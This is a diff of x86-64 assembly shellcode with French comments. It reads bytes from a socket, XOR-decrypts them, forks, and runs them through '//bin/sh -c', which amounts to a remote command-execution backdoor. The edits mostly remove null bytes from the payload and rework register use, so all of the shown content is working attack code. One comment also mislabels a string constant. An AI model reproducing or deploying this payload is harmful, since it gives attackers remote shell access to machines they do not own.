@@ -56,16 +56,18 @@ _read:
 
 	mov rdi, r15			; rdi <- unsigned int fd
 
-	push sock_buffer
+	mov esi, sock_buffer+0x11111111
+	sub esi, 0x11111111
+	push rsi
 	mov rsi, rsp			; rsi <- char *buf :
 					        ; destination (on alloue une la taille de 255 à la mémoire)
-		
+
 	mov dl, 255			; rdx <- size_t count : on lui donne la taille du buffer
 	syscall
 
     mov rbx, rax            ; get size of what is received
 
-	cmp rax, rcx
+	cmp rax, r12            ; cmp rax to 0
     jz _exit               ; jump in exit if receved is nothing
 
 _decrypt_xor:              ; xor decrypt function
@@ -83,11 +85,12 @@ _decrypt_xor:              ; xor decrypt function
 
 ; ---- (57) sys_fork ----
 _fork:
-    xor rcx, rcx
+
 	mov al, 57			; sys_fork
 	syscall
 
-	cmp rax, rcx			; compare if in child process
+    xor rbx, rbx
+	cmp rax, rbx      	; compare if in child process
 	je _execve			; jmp child process to execve
 
     cmp rax, -1
@@ -100,32 +103,32 @@ _fork:
 _execve:
     xor rbx, rbx
     xor rcx, rcx
-	xor rsi, rsi	
+	xor rsi, rsi
 	xor r13, r13
-        
+
 	push rbx
     mov rbx, 0x68732f6e69622f2f     ; //bin/sh
-        
+
 	push rcx			; push 0
 	push rbx			; push //bin/sh
     mov rdi, rsp        ; rdi arg : const char *filename
 
 	push rcx			; push 0 -> cleaning stack
 
-	mov r13, 0x205c632d ; "-c"
-	push r13			; push "-c"
+	mov r13w, 0x632d		; "-c"
+	push r13w			; push "-c"
 	mov r14, rsp		; char * '-c'
-	
+
 	push rcx			; push 0
-	
+
 	push r12			; push fd de sys_read
 	mov r12, [rsp]      ; mov du contenu de r12 afin de prendre plus que 8byte
-	
+
 	push rcx			; push 0
 
 	push rbx			; push //bin/sh (rbx)
 	mov rbx, rsp		; char * '//bin/sh'
-	
+
 	push rcx			; push 0 -> cleaning stack
 
 	push r12			; push fd de sys_read
@@ -152,7 +155,7 @@ _send_error:
 ; ---- (2) sys_write (unsigned int fd, const char *buf, size_t count) ----
     xor rcx, rcx
 
-    mov rcx, 0x726f727265667266       ; "error"
+    mov rcx, 0x726f727265667266       ; "frkerror"
     push rcx
     mov rsi, rsp                ; rsi = const char *buf
 
